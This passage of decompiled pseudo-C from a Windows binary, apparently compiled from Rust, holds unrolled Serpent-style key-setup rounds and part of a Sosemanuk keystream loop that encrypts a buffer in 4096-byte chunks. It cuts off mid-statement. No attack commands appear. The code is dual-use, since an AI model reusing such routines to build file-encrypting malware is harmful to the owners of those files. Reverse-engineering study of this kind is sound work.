v868;\n  v969 = v198 ^ (v1086 ^ v1018) & v1087;\n  v199 = v1087 | v198;\n  v1017 = v1086 ^ v1018 ^ v969 & ~v1016;\n  v200 = ~(v969 ^ v199 ^ v1086);\n  v869 = (v200 | v1017) ^ v1086 ^ v1018 ^ v199;\n  v1019 = v200 ^ v1017 & (v1086 ^ v1018);\n  v201 = v1014 ^ v1089 ^ v966;\n  v1015 = v1041 ^ v1088 ^ (v966 | v1014);\n  v967 = v1015 ^ v201;\n  v1043 = (v1015 ^ v201) & (v1041 ^ v1088) ^ v1042;\n  v202 = v960 ^ (v962 | v1012);\n  v203 = v1012 ^ v202;\n  v1013 = v202 ^ v964 & (v960 | v962 ^ v1012);\n  v204 = v202;\n  v205 = v962 ^ v202;\n  v206 = v964 ^ (v962 | v204);\n  v965 = v203 ^ (v964 | v205);\n  v207 = v205 ^ v206;\n  v961 = v205 ^ (v965 | ~(v207 ^ v203));\n  v963 = v205 ^ v965 & v207;\n  v208 = v958 ^ v956 & v1030;\n  v209 = v1090 ^ v956 ^ v1030;\n  v1011 = v1090 ^ v956 ^ (v958 | v1010);\n  v888 = v1090 ^ v1030 ^ v208;\n  v1031 = (v208 | ~v209) ^ (v1011 | v1090 ^ v1030);\n  v959 = v209 ^ (v1090 | v208);\n  v898 = ~v1082 ^ v897;\n  v210 = v898 ^ v1008 ^ v907;\n  v211 = v1085 ^ v1008 ^ v210;\n  v212 = v1085 | v1008 ^ v907;\n  v1009 = v212 & (~v1082 | v1085 ^ v1008);\n  v908 = v211 ^ v1009 & v210;\n  v957 = v212 ^ v1009 & v211;\n  v213 = v901 ^ v1092 & v954;\n  v955 = v213 ^ v1091 ^ v954;\n  v214 = v1091 ^ (v1092 | v901);\n  v215 = v1092 ^ v955 ^ v213 & v214;\n  v855 = v214 ^ v215;\n  v902 = v213 ^ (v1092 ^ v955 | v214);\n  v216 = v952 & v1006;\n  v217 = v952 | v1093;\n  v953 = (v952 | v1093) & v950 ^ (v952 & v1006 | v946);\n  v218 = v216 ^ v953;\n  v219 = v217 ^ v216;\n  v220 = v948 ^ v950;\n  v951 = v948 ^ v950 ^ (v219 | v218);\n  v949 = v219 ^ v951 & ~v953;\n  v1007 = v220 ^ v946 & v219;\n  v947 = v880 ^ v1079;\n  v1005 = (v880 ^ v1079) & v1080 ^ v1079 ^ v1004;\n  v1035 = (v880 | v1079) ^ v1034;\n  v221 = ~v1000 ^ v922;\n  v881 = v221 ^ (v1095 ^ v1002) & v1094;\n  v222 = v1094 | v221;\n  v1001 = v1095 ^ v1002 ^ v881 & ~v1000;\n  v223 = ~(v881 ^ v222 ^ v1095);\n  v923 = (v223 | v1001) ^ v1095 ^ v1002 ^ v222;\n  v1003 = v223 ^ v1001 & (v1095 ^ v1002);\n  v224 = v994 ^ v882 ^ v1078;\n  v995 = v919 ^ v877 ^ (v1078 | v994);\n  v883 = v995 ^ v224;\n  v866 = (v995 ^ v224) & (v919 ^ v877) ^ v857 ^ v865;\n  v225 = v1096 ^ (v942 | v998);\n  v226 = v998 ^ v225;\n  v999 = v225 ^ v944 & (v1096 | v942 ^ v998);\n  v227 = v225;\n  v228 = v942 ^ v225;\n  v878 = v226 ^ (v944 | v228);\n  v229 = v228 ^ v944 ^ (v942 | v227);\n  v943 = v228 ^ (v878 | ~(v229 ^ v226));\n  v945 = v228 ^ v878 & v229;\n  v230 = v940 ^ v936 & v992;\n  v997 = v1097 ^ v936 ^ (v940 | v996);\n  v231 = v1097 ^ v992 ^ v230;\n  v232 = (v230 | ~(v1097 ^ v936 ^ v992)) ^ (v997 | v1097 ^ v992);\n  v941 = v1097 ^ v936 ^ v992 ^ (v1097 | v230);\n  v233 = v885 & v905 | v873;\n  v234 = v233 ^ v905;\n  v874 = ~v1074 ^ v873;\n  v235 = v874 ^ v233 ^ v905;\n  v236 = v885 ^ v233;\n  v237 = v885 | v234;\n  v858 = v237 & (~v1074 | v236);\n  v906 = v236 ^ v235 ^ v858 & v235;\n  v937 = v237 ^ v858 & (v236 ^ v235);\n  v238 = v1044 ^ v1039 & v934;\n  v935 = v238 ^ v1037 ^ v934;\n  v239 = v1037 ^ (v1039 | v1044);\n  v240 = v1039 ^ v935 ^ v238 & v239;\n  v241 = v239 ^ v240;\n  v242 = v238 ^ (v1039 ^ v935 | v239);\n  v243 = v932 | v926;\n  v244 = v932 & v1046;\n  v933 = (v932 | v926) & v930 ^ (v932 & v1046 | v938);\n  v245 = v244 ^ v933;\n  v246 = v243 ^ v244;\n  v927 = v928 ^ v930 ^ (v246 | v245);\n  v1040 = v246 ^ v927 & ~v933;\n  v1047 = v928 ^ v930 ^ v938 & v246;\n  v1116 = *a6;\n  v917 = ~v916;\n  v886 = v861 ^ v186;\n  v914 = ~v913;\n  v911 = v894 ^ v910;\n  v870 = ~v869;\n  v889 = v1031 ^ v888;\n  v939 = ~v215;\n  v856 = v902 ^ v855;\n  v924 = ~v923;\n  v993 = v232;\n  v931 = v232 ^ v231;\n  v929 = ~v240;\n  v247 = v242 ^ v241;\n  v1038 = v242 ^ v241;\n  v1045 = v242;\n  v248 = sub_140009E06(&v1116, 0i64, 4i64, &off_1400669A8);\n  v249 = sub_1400135C9(v248);\n  v250 = sub_140009E06(&v1116, 4i64, 8i64, &off_1400669C0);\n  v251 = sub_1400135C9(v250);\n  v252 = sub_140009E06(&v1116, 8i64, 12i64, &off_1400669D8);\n  v253 = sub_1400135C9(v252);\n  v254 = sub_140009E06(&v1116, 12i64, 16i64, &off_1400669F0);\n  v255 = v1040 ^ v249;\n  v256 = v927 ^ v251;\n  v257 = v1047 ^ sub_1400135C9(v254);\n  v258 = v255 ^ v257;\n  v259 = v255 ^ v256 & (v255 ^ v257);\n  v260 = v933 ^ v253;\n  v261 = v260 ^ v256;\n  v262 = v261 ^ (v255 | v257);\n  v263 = v258 ^ v261;\n  v264 = v260 ^ v258;\n  v265 = v263 ^ (v259 | v260);\n  v266 = v259 | ~v263;\n  v267 = v264 ^ v259;\n  v268 = v266 ^ (v262 | v264);\n  v269 = __ROL4__(v268 ^ v267, 13);\n  v270 = __ROL4__(v265, 3);\n  v271 = __ROL4__(v269 ^ v270 ^ v268, 1);\n  v272 = __ROL4__((8 * v269) ^ v270 ^ v262, 7);\n  v273 = __ROL4__(v272 ^ v271 ^ v269, 5);\n  v274 = __ROL4__(v272 ^ v270 ^ (v271 << 7), 22);\n  v275 = v242 ^ v271;\n  v276 = v929 ^ v272;\n  v277 = ~(v935 ^ v273);\n  v278 = ~(v277 & v275 ^ v247 ^ v274);\n  v279 = v276 | v277 & v275;\n  v280 = v278 ^ v276;\n  v281 = v279 ^ v275;\n  v282 = v277 ^ v279;\n  v283 = v281 | v277;\n  v284 = v280 ^ v281;\n  v285 = v283 & (v282 | v278);\n  v286 = v284 ^ v282;\n  v287 = __ROL4__(v280, 3);\n  v288 = v286 ^ v287 ^ v285 & v284;\n  v289 = v285 & v286;\n  v290 = __ROL4__(v285, 13);\n  v291 = __ROL4__(v290 ^ v289 ^ v287 ^ v283, 1);\n  v292 = __ROL4__((8 * v290) ^ v288, 7);\n  v293 = __ROL4__((v291 << 7) ^ v292 ^ v287, 22);\n  v294 = v858 ^ __ROL4__(v292 ^ v291 ^ v290, 5);\n  v295 = v937 ^ v291;\n  v296 = v874 ^ v293;\n  v297 = v906 ^ v292;\n  v298 = v297 ^ v294 & v296;\n  v299 = v295 ^ (v294 | v297);\n  v300 = v298 ^ v295 ^ v296;\n  v301 = v300 ^ v294;\n  v302 = v298 ^ (v299 | v301);\n  v303 = v301 ^ v299 & v298;\n  v304 = __ROL4__(v300, 13);\n  v305 = __ROL4__(v302 ^ v303 ^ v299, 3);\n  v306 = __ROL4__(v305 ^ v304 ^ v302, 1);\n  v307 = __ROL4__(~(v305 ^ v303 ^ (8 * v304)), 7);\n  v308 = __ROL4__(v307 ^ v305 ^ (v306 << 7), 22);\n  v309 = v931 ^ __ROL4__(v307 ^ v306 ^ v304, 5);\n  v310 = v993 ^ v306;\n  v311 = v941 ^ v308;\n  v312 = v997 ^ v307;\n  v313 = v312 | v309;\n  v314 = v310 ^ v312;\n  v315 = v309 & v310;\n  v316 = v311 ^ v309;\n  v317 = v314 ^ v311;\n  v318 = v313 & v314 ^ (v315 | v316);\n  v319 = v315 ^ v313;\n  v320 = v317 ^ (v319 | v318 ^ v315);\n  v321 = __ROL4__(v319 ^ v320 & ~v318, 13);\n  v322 = __ROL4__(v318, 3);\n  v323 = __ROL4__(v321 ^ v322 ^ v320, 1);\n  v324 = __ROL4__((8 * v321) ^ v322 ^ v317 ^ v319 & v316, 7);\n  v325 = v324 ^ v323 ^ v321;\n  v326 = __ROL4__(v324 ^ v322 ^ (v323 << 7), 22);\n  v327 = v878 ^ v324;\n  v328 = ~(v878 ^ v324);\n  v329 = v326 ^ v945 ^ v328;\n  v330 = __ROL4__(v325, 5) ^ v943 ^ v328;\n  v331 = v999 ^ v323;\n  v332 = v331 ^ v327;\n  v333 = v329 ^ v332 & v330;\n  v334 = v330 ^ v332;\n  v335 = ~v331;\n  v336 = v334 & v329;\n  v337 = v336 ^ v331;\n  v338 = v335 ^ v336;\n  v339 = v333 & v335;\n  v340 = v330 ^ v339;\n  v341 = v339 ^ (v333 | v334);\n  v342 = __ROL4__(v333, 13);\n  v343 = __ROL4__(v337 ^ (v339 | v330), 3);\n  v344 = __ROL4__(v343 ^ v340 & v338 ^ v342 ^ v341, 1);\n  v345 = __ROL4__(v343 ^ v340 ^ (8 * v342), 7);\n  v346 = __ROL4__(v344 ^ v345 ^ v342, 5);\n  v347 = __ROL4__((v344 << 7) ^ v345 ^ v343, 22);\n  v348 = v919 ^ v344;\n  v349 = v346 ^ v348 ^ v995;\n  v350 = v866 ^ v345;\n  v351 = v350 ^ v348;\n  v352 = ~v350;\n  v353 = v352 ^ v883 ^ v347;\n  v354 = v353 ^ v351 & v349;\n  v355 = v351 | v353;\n  v356 = v349 ^ v354 & v352;\n  v357 = v354 ^ v355 ^ v348;\n  v358 = __ROL4__(v354, 13);\n  v359 = ~v357;\n  v360 = v355 ^ (v356 | v359) ^ v349 ^ (8 * v358);\n  v361 = __ROL4__(v359 ^ v349 & v356, 3);\n  v362 = __ROL4__(v361 ^ v358 ^ v356, 1);\n  v363 = __ROL4__(~(v361 ^ v360), 7);\n  v364 = v881 ^ __ROL4__(v363 ^ v362 ^ v358, 5);\n  v365 = v1003 ^ __ROL4__(v363 ^ v361 ^ (v362 << 7), 22);\n  v366 = v924 ^ v363;\n  v367 = v366 & v364;\n  v368 = v366 ^ v364;\n  v369 = ~v365 ^ v367;\n  v370 = v369 ^ v1001 ^ v362;\n  v371 = v368 ^ (v366 | ~v365);\n  v372 = v370 | v368;\n  v373 = v370 ^ v371;\n  v374 = v373 ^ (v369 | v372);\n  v375 = v374 ^ v372 ^ v366 ^ v369;\n  v376 = __ROL4__(v374, 13);\n  v377 = (8 * v376) ^ v365 ^ v375 & v373;\n  v378 = __ROL4__(v375, 3);\n  v379 = __ROL4__(v378 ^ v376 ^ v370, 1);\n  v380 = __ROL4__(v377 ^ v378 ^ v367, 7);\n  v381 = v380 ^ v379 ^ v376;\n  v382 = __ROL4__(v380 ^ v378 ^ (v379 << 7), 22);\n  v383 = v1005 ^ v379;\n  v384 = v1035 ^ v382;\n  v385 = v947 ^ v380;\n  v386 = v385 ^ (v383 | v384);\n  v387 = v384 ^ v386;\n  v388 = v1072 ^ __ROL4__(v381, 5);\n  v389 = v388 & (v385 | v383 ^ v384);\n  v390 = v383 ^ v386;\n  v391 = v386 ^ v389;\n  v392 = v388 ^ (v383 | v386);\n  v393 = v387 ^ (v390 | v388);\n  v394 = v390 ^ v392;\n  v395 = __ROL4__(v390 ^ (v393 | ~(v394 ^ v387)), 13);\n  v396 = __ROL4__(v390 ^ v393 & v394, 3);\n  v397 = __ROL4__(v395 ^ v396 ^ v391, 1);\n  v398 = __ROL4__((8 * v395) ^ v396 ^ v393, 7);\n  v399 = v398 ^ v396 ^ (v397 << 7);\n  v400 = v949 ^ __ROL4__(v398 ^ v397 ^ v395, 5);\n  v401 = v951 ^ v397;\n  v402 = v1007 ^ v398;\n  v403 = v402 ^ v400;\n  v404 = v400 ^ v401 & (v402 ^ v400);\n  v405 = v953 ^ __ROL4__(v399, 22);\n  v406 = v405 ^ v401;\n  v407 = v406 ^ (v400 | v402);\n  v408 = v403 ^ v406;\n  v409 = v405 ^ v403;\n  v410 = (v404 | ~v408) ^ (v409 | v407);\n  v411 = __ROL4__(v410 ^ v404 ^ v409, 13);\n  v412 = __ROL4__(v408 ^ (v404 | v405), 3);\n  v413 = __ROL4__(v411 ^ v412 ^ v410, 1);\n  v414 = __ROL4__((8 * v411) ^ v412 ^ v407, 7);\n  v415 = __ROL4__(v414 ^ v413 ^ v411, 5);\n  v416 = __ROL4__(v414 ^ v412 ^ (v413 << 7), 22);\n  v417 = v902 ^ v413;\n  v418 = v939 ^ v414;\n  v419 = ~(v955 ^ v415);\n  v420 = ~(v419 & v417 ^ v856 ^ v416);\n  v421 = v418 | v419 & v417;\n  v422 = v420 ^ v418;\n  v423 = v421 ^ v417;\n  v424 = v419 ^ v421;\n  v425 = v423 | v419;\n  v426 = v422 ^ v423;\n  v427 = v425 & (v424 | v420);\n  v428 = v426 ^ v424;\n  v429 = __ROL4__(v422, 3);\n  v430 = v428 ^ v429 ^ v427 & v426;\n  v431 = v427 & v428 ^ v429 ^ v425;\n  v432 = __ROL4__(v427, 13);\n  v433 = __ROL4__(v432 ^ v431, 1);\n  v434 = __ROL4__((8 * v432) ^ v430, 7);\n  v435 = __ROL4__((v433 << 7) ^ v434 ^ v429, 22);\n  v436 = v1009 ^ __ROL4__(v434 ^ v433 ^ v432, 5);\n  v437 = v957 ^ v433;\n  v438 = v898 ^ v435;\n  v439 = v908 ^ v434;\n  v440 = v439 ^ v436 & v438;\n  v441 = v437 ^ (v436 | v439);\n  v442 = v440 ^ v437 ^ v438;\n  v443 = v442 ^ v436;\n  v444 = v440 ^ (v441 | v443);\n  v445 = v443 ^ v441 & v440;\n  v446 = __ROL4__(v442, 13);\n  v447 = __ROL4__(v444 ^ v445 ^ v441, 3);\n  v448 = __ROL4__(v447 ^ v446 ^ v444, 1);\n  v449 = __ROL4__(~(v447 ^ v445 ^ (8 * v446)), 7);\n  v450 = __ROL4__(v449 ^ v447 ^ (v448 << 7), 22);\n  v451 = v889 ^ __ROL4__(v449 ^ v448 ^ v446, 5);\n  v452 = v1031 ^ v448;\n  v453 = v959 ^ v450;\n  v454 = v1011 ^ v449;\n  v455 = v454 | v451;\n  v456 = v452 ^ v454;\n  v457 = v451 & v452;\n  v458 = v453 ^ v451;\n  v459 = v456 ^ v453;\n  v460 = v455 & v456 ^ (v457 | v458);\n  v461 = v457 ^ v455;\n  v462 = v459 ^ (v461 | v460 ^ v457);\n  v463 = __ROL4__(v461 ^ v462 & ~v460, 13);\n  v464 = __ROL4__(v460, 3);\n  v465 = __ROL4__(v463 ^ v464 ^ v462, 1);\n  v466 = __ROL4__((8 * v463) ^ v464 ^ v459 ^ v461 & v458, 7);\n  v467 = __ROL4__(v466 ^ v465 ^ v463, 5);\n  v468 = __ROL4__(v466 ^ v464 ^ (v465 << 7), 22);\n  v469 = v1013 ^ v465 ^ v965 ^ v466;\n  v470 = ~(v965 ^ v466);\n  v471 = v468 ^ v470 ^ v963;\n  v472 = v467 ^ v961 ^ v470;\n  v473 = v471 ^ v469 & v472;\n  v474 = v472 ^ v469;\n  v475 = ~(v1013 ^ v465);\n  v476 = v474 & v471;\n  v477 = v476 ^ v1013 ^ v465;\n  v478 = v475 ^ v476;\n  v479 = v473 & v475;\n  v480 = v472 ^ v479;\n  v481 = v479 ^ (v473 | v474);\n  v482 = __ROL4__(v473, 13);\n  v483 = (v472 ^ v479) & v478 ^ v482 ^ v481;\n  v484 = __ROL4__(v477 ^ (v479 | v472), 3);\n  v485 = __ROL4__(v484 ^ v483, 1);\n  v486 = __ROL4__(v484 ^ v480 ^ (8 * v482), 7);\n  v487 = (v485 << 7) ^ v486 ^ v484;\n  v488 = __ROL4__(v485 ^ v486 ^ v482, 5);\n  v489 = v1041 ^ v485;\n  v490 = v488 ^ v489 ^ v1015;\n  v491 = v1043 ^ v486;\n  v492 = v491 ^ v489;\n  v493 = ~v491;\n  v494 = __ROL4__(v487, 22) ^ v967 ^ v493;\n  v495 = v494 ^ v492 & v490;\n  v496 = v492 | v494;\n  v497 = v490 ^ v495 & v493;\n  v498 = ~(v495 ^ v496 ^ v489);\n  v499 = __ROL4__(v495, 13);\n  v500 = (v497 | v498) ^ (8 * v499) ^ v490 ^ v496;\n  v501 = __ROL4__(v498 ^ v490 & v497, 3);\n  v502 = __ROL4__(v501 ^ v499 ^ v497, 1);\n  v503 = __ROL4__(~(v501 ^ v500), 7);\n  v504 = v969 ^ __ROL4__(v503 ^ v502 ^ v499, 5);\n  v505 = v1019 ^ __ROL4__(v503 ^ v501 ^ (v502 << 7), 22);\n  v506 = v870 ^ v503;\n  v507 = v506 & v504;\n  v508 = v506 ^ v504;\n  v509 = ~v505 ^ v507;\n  v510 = v509 ^ v1017 ^ v502;\n  v511 = v508 ^ (v506 | ~v505);\n  v512 = v510 | v508;\n  v513 = v510 ^ v511;\n  v514 = v513 ^ (v509 | v512);\n  v515 = v514 ^ v512 ^ v506 ^ v509;\n  v516 = __ROL4__(v514, 13);\n  v517 = (8 * v516) ^ v505 ^ v515 & v513;\n  v518 = __ROL4__(v515, 3);\n  v519 = __ROL4__(v518 ^ v516 ^ v510, 1);\n  v520 = __ROL4__(v517 ^ v518 ^ v507, 7);\n  v521 = v520 ^ v519 ^ v516;\n  v522 = __ROL4__(v520 ^ v518 ^ (v519 << 7), 22);\n  v523 = v1021 ^ v519;\n  v524 = v1055 ^ v522;\n  v525 = v971 ^ v520;\n  v526 = v525 ^ (v523 | v524);\n  v527 = v524 ^ v526;\n  v528 = v1073 ^ __ROL4__(v521, 5);\n  v529 = v528 & (v525 | v523 ^ v524);\n  v530 = v523 ^ v526;\n  v531 = v526 ^ v529;\n  v532 = v528 ^ (v523 | v526);\n  v533 = v527 ^ (v530 | v528);\n  v534 = v530 ^ v532;\n  v535 = __ROL4__(v530 ^ (v533 | ~(v534 ^ v527)), 13);\n  v536 = __ROL4__(v530 ^ v533 & v534, 3);\n  v537 = __ROL4__(v535 ^ v536 ^ v531, 1);\n  v538 = __ROL4__((8 * v535) ^ v536 ^ v533, 7);\n  v539 = v538 ^ v536 ^ (v537 << 7);\n  v540 = v973 ^ __ROL4__(v538 ^ v537 ^ v535, 5);\n  v541 = v975 ^ v537;\n  v542 = v1057 ^ v538;\n  v543 = v542 ^ v540;\n  v544 = v540 ^ v541 & (v542 ^ v540);\n  v545 = v977 ^ __ROL4__(v539, 22);\n  v546 = v545 ^ v541;\n  v547 = v546 ^ (v540 | v542);\n  v548 = v543 ^ v546;\n  v549 = v545 ^ v543;\n  v550 = (v544 | ~v548) ^ (v549 | v547);\n  v551 = __ROL4__(v550 ^ v544 ^ v549, 13);\n  v552 = __ROL4__(v548 ^ (v544 | v545), 3);\n  v553 = __ROL4__(v551 ^ v552 ^ v550, 1);\n  v554 = __ROL4__((8 * v551) ^ v552 ^ v547, 7);\n  v555 = __ROL4__(v554 ^ v553 ^ v551, 5);\n  v556 = __ROL4__(v554 ^ v552 ^ (v553 << 7), 22);\n  v557 = v894 ^ v553;\n  v558 = v914 ^ v554;\n  v559 = ~(v979 ^ v555);\n  v560 = ~(v559 & v557 ^ v911 ^ v556);\n  v561 = v558 | v559 & v557;\n  v562 = v560 ^ v558;\n  v563 = v561 ^ v557;\n  v564 = v559 ^ v561;\n  v565 = v563 | v559;\n  v566 = v562 ^ v563;\n  v567 = v565 & (v564 | v560);\n  v568 = v566 ^ v564;\n  v569 = __ROL4__(v562, 3);\n  v570 = v568 ^ v569 ^ v567 & v566;\n  v571 = v567 & v568;\n  v572 = __ROL4__(v567, 13);\n  v573 = __ROL4__(v572 ^ v571 ^ v569 ^ v565, 1);\n  v574 = __ROL4__((8 * v572) ^ v570, 7);\n  v575 = __ROL4__(v574 ^ v573 ^ v572, 5);\n  v576 = __ROL4__((v573 << 7) ^ v574 ^ v569, 22);\n  v577 = _mm_cvtsi32_si128(v575);\n  v578 = _mm_cvtsi32_si128(v576);\n  v579 = v1060 ^ v575;\n  v580 = v1063 ^ v576;\n  v581 = v983 ^ v574 ^ v579 & v580;\n  v582 = v981 ^ v573 ^ (v579 | v983 ^ v574);\n  v583 = v581 ^ v981 ^ v573 ^ v580;\n  v584 = v583 ^ v579;\n  v585 = v581 ^ (v582 | v584);\n  v586 = v584 ^ v582 & v581;\n  v587 = __ROL4__(v583, 13);\n  v588 = __ROL4__(v585 ^ v586 ^ v582, 3);\n  v589 = __ROL4__(v588 ^ v587 ^ v585, 1);\n  v590 = __ROL4__(~(v588 ^ v586 ^ (8 * v587)), 7);\n  v591 = __ROL4__(v590 ^ v588 ^ (v589 << 7), 22);\n  v592 = v861 ^ v186 ^ __ROL4__(v590 ^ v589 ^ v587, 5);\n  v593 = v861 ^ v589;\n  v594 = v985 ^ v591;\n  v595 = v1066 ^ v590;\n  v596 = v595 | v592;\n  v597 = v593 ^ v595;\n  v598 = v592 & v593;\n  v599 = v594 ^ v592;\n  v600 = v597 ^ v594;\n  v601 = v596 & v597 ^ (v598 | v599);\n  v602 = v598 ^ v596;\n  v603 = v600 ^ (v602 | v601 ^ v598);\n  v604 = __ROL4__(v602 ^ v603 & ~v601, 13);\n  v605 = __ROL4__(v601, 3);\n  v606 = __ROL4__(v604 ^ v605 ^ v603, 1);\n  v607 = __ROL4__((8 * v604) ^ v605 ^ v600 ^ v602 & v599, 7);\n  v608 = v607 ^ v606 ^ v604;\n  v609 = __ROL4__(v607 ^ v605 ^ (v606 << 7), 22);\n  v610 = v987 ^ v607;\n  v611 = ~(v987 ^ v607);\n  v612 = v609 ^ v1069 ^ v611;\n  v613 = __ROL4__(v608, 5) ^ v1068 ^ v611;\n  v614 = v991 ^ v606;\n  v615 = v614 ^ v610;\n  v616 = v612 ^ v615 & v613;\n  v617 = v613 ^ v615;\n  v618 = ~v614;\n  v619 = v617 & v612;\n  v620 = v619 ^ v614;\n  v621 = v618 ^ v619;\n  v622 = v616 & v618;\n  v623 = v613 ^ v622;\n  v624 = v622 ^ (v616 | v617);\n  v625 = __ROL4__(v616, 13);\n  v626 = __ROL4__(v620 ^ (v622 | v613), 3);\n  v627 = __ROL4__(v626 ^ v623 & v621 ^ v625 ^ v624, 1);\n  v628 = __ROL4__(v626 ^ v623 ^ (8 * v625), 7);\n  v629 = (v627 << 7) ^ v628 ^ v626;\n  v630 = __ROL4__(v627 ^ v628 ^ v625, 5);\n  v631 = v1051 ^ v627;\n  v632 = v630 ^ v631 ^ v891;\n  v633 = v1053 ^ v628;\n  v634 = v633 ^ v631;\n  v635 = ~v633;\n  v636 = __ROL4__(v629, 22) ^ v989 ^ v635;\n  v637 = v636 ^ v634 & v632;\n  v638 = v634 | v636;\n  v639 = v632 ^ v637 & v635;\n  v640 = ~(v637 ^ v638 ^ v631);\n  v641 = __ROL4__(v637, 13);\n  v642 = (v639 | v640) ^ (8 * v641) ^ v632 ^ v638;\n  v643 = __ROL4__(v640 ^ v632 & v639, 3);\n  v644 = __ROL4__(v643 ^ v641 ^ v639, 1);\n  v645 = __ROL4__(~(v643 ^ v642), 7);\n  v646 = v1070 ^ __ROL4__(v645 ^ v644 ^ v641, 5);\n  v647 = v852 ^ __ROL4__(v645 ^ v643 ^ (v644 << 7), 22);\n  v648 = v917 ^ v645;\n  v649 = v648 & v646;\n  v650 = v648 ^ v646;\n  v651 = ~v647 ^ v649;\n  v652 = v651 ^ v1024 ^ v644;\n  v653 = v650 ^ (v648 | ~v647);\n  v654 = v652 | v650;\n  v655 = v652 ^ v653;\n  v656 = v655 ^ (v651 | v654);\n  v657 = v656 ^ v654 ^ v648 ^ v651;\n  v658 = __ROL4__(v656, 13);\n  v659 = (8 * v658) ^ v647 ^ v657 & v655;\n  v660 = __ROL4__(v657, 3);\n  v661 = __ROL4__(v660 ^ v658 ^ v652, 1);\n  v662 = __ROL4__(v659 ^ v660 ^ v649, 7);\n  v663 = v662 ^ v661 ^ v658;\n  v664 = __ROL4__(v662 ^ v660 ^ (v661 << 7), 22);\n  v665 = v1071 ^ v661;\n  v666 = v1028 ^ v664;\n  v667 = v1098 ^ v662;\n  v668 = v667 ^ (v665 | v666);\n  v669 = v666 ^ v668;\n  v670 = v1099 ^ __ROL4__(v663, 5);\n  v671 = v670 & (v667 | v665 ^ v666);\n  v672 = v665 ^ v668;\n  v673 = v668 ^ v671;\n  v674 = v670 ^ (v665 | v668);\n  v675 = v669 ^ (v672 | v670);\n  v676 = v672 ^ v674;\n  v677 = __ROL4__(v672 ^ (v675 | ~(v676 ^ v669)), 13);\n  v678 = __ROL4__(v672 ^ v675 & v676, 3);\n  v679 = __ROL4__(v677 ^ v678 ^ v673, 1);\n  *(_QWORD *)&v1116 = __PAIR64__(v927, v1040);\n  *((_QWORD *)&v1116 + 1) = __PAIR64__(v1047, v933);\n  *(_QWORD *)&v1117 = __PAIR64__(v1045, v935);\n  *((_QWORD *)&v1117 + 1) = __PAIR64__(v929, v1038);\n  v1118 = v858;\n  v1119 = v937;\n  v1120 = v874;\n  v1121 = v906;\n  v1122 = v931;\n  v1123 = v993;\n  v1124 = v941;\n  v1125 = v997;\n  v1126 = v943;\n  v1127 = v999;\n  v1128 = v945;\n  v1129 = v878;\n  v1130 = v995;\n  v1131 = v919;\n  v1132 = v883;\n  v1133 = v866;\n  v1134 = v881;\n  v1135 = v1001;\n  v1136 = v1003;\n  v1137 = v924;\n  v1138 = v1072;\n  v1139 = v1005;\n  v1140 = v1035;\n  v1141 = v947;\n  v1142 = v949;\n  v1143 = v951;\n  v1144 = v953;\n  v1145 = v1007;\n  v1146 = v955;\n  v1147 = v902;\n  v1148 = v856;\n  v1149 = v939;\n  v1150 = v1009;\n  v1151 = v957;\n  v1152 = v898;\n  v1153 = v908;\n  v1154 = v889;\n  v1155 = v1031;\n  v1156 = v959;\n  v1157 = v1011;\n  v1158 = v961;\n  v1159 = v1013;\n  v1160 = v963;\n  v1161 = v965;\n  v1162 = v1015;\n  v1163 = v1041;\n  v1164 = v967;\n  v1165 = v1043;\n  v1166 = v969;\n  v1167 = v1017;\n  v1168 = v1019;\n  v1169 = v870;\n  v1170 = v1073;\n  v1171 = v1021;\n  v1172 = v1055;\n  v1173 = v971;\n  v1174 = v973;\n  v1175 = v975;\n  v1176 = v977;\n  v1177 = v1057;\n  v1178 = v979;\n  v1179 = v894;\n  v1180 = v911;\n  v1181 = v914;\n  v1182 = v1060;\n  v1183 = v981;\n  v1184 = v1063;\n  v1185 = v983;\n  v1186 = v886;\n  v1187 = v861;\n  v1188 = v985;\n  v1189 = v1066;\n  v1190 = v1068;\n  v1191 = v991;\n  v1192 = v1069;\n  v1193 = v987;\n  v1194 = v891;\n  v1195 = v1051;\n  v1196 = v989;\n  v1197 = v1053;\n  v1198 = v1070;\n  v1199 = v1024;\n  v1200 = v852;\n  v1201 = v917;\n  v1202 = v1099;\n  v1203 = v1071;\n  v1204 = v1028;\n  v680 = __ROL4__((8 * v677) ^ v678 ^ v675, 7);\n  v1205 = v1098;\n  v681 = __ROL4__(v680 ^ v678 ^ (v679 << 7), 22);\n  v682 = _mm_unpacklo_epi32(v577, v578).m128i_u64[0];\n  v683 = v1100 ^ __ROL4__(v680 ^ v679 ^ v677, 5);\n  v684 = v1048 ^ v679;\n  v685 = v1050 ^ v681;\n  v686 = v1101 ^ v680;\n  v1206 = v1100;\n  v1207 = v1048;\n  v1208 = v1050;\n  v1209 = v1101;\n  v687 = &v1111;\n  v688 = 20i64;\n  v689 = v1210;\n  while ( v688 )\n  {\n    *(_DWORD *)v689 = *(_DWORD *)v687;\n    v687 = (__int128 *)((char *)v687 + 4);\n    v689 += 4;\n    --v688;\n  }\n  v1211 = v686;\n  v1212 = v685;\n  v1213 = v684;\n  v1214 = v683;\n  v1215 = v573;\n  v1216 = v574;\n  v1217 = v466;\n  v1218 = v468;\n  v1219 = v465;\n  v1220 = v467;\n  v1221 = v682;\n  v1222 = 80;\n  v690 = v1108;\n  v691 = v1109;\n  do\n  {\n    v692 = v690 - v691;\n    if ( v692 >= 0x1000 )\n      v692 = 4096i64;\n    v693 = sub_14001B60D(&v1107, v692);\n    v695 = v694;\n    v1058 = v692;\n    v1036 = sub_14001B65A(0, v692, (unsigned int)v1223, 4096, (__int64)&off_1400681D0);\n    if ( v695 != v696 )\n    {\n      v847 = \"assertion failed: input.len() == output.len()\";\n      v848 = &off_140066A38;\n      v849 = 45i64;\n      goto LABEL_26;\n    }\n    v697 = 0i64;\n    v1064 = v693;\n    v1061 = v695;\n    while ( v695 != v697 )\n    {\n      v698 = *(_BYTE *)(v693 + v697);\n      v699 = v1222;\n      if ( v1222 == 80i64 )\n      {\n        v1029 = v697;\n        v853 = *(_BYTE *)(v693 + v697);\n        v875 = v1216;\n        v895 = v1219;\n        v700 = HIDWORD(v1221) + (v1212 ^ v1219 & -(v1221 & 1));\n        v701 = __ROL4__(1415926535 * v1221, 7);\n        v702 = v1220 ^ Sosemanuk_140066428[(unsigned __int8)v1214] ^ Sosemanuk_140066028[HIBYTE(v1211)] ^ (v1214 >> 8) ^ (v1211 << 8);\n        v862 = v1220;\n        v703 = v701 ^ (v700 + v1220);\n        v704 = 1415926535 * v700;\n        v705 = v701 + (v1213 ^ v1220 & -(v700 & 1));\n        v706 = __ROL4__(v704, 7);\n        v903 = v1215;\n        v707 = v706 ^ (v705 + v702);\n        v708 = 1415926535 * v705;\n        v709 = v706 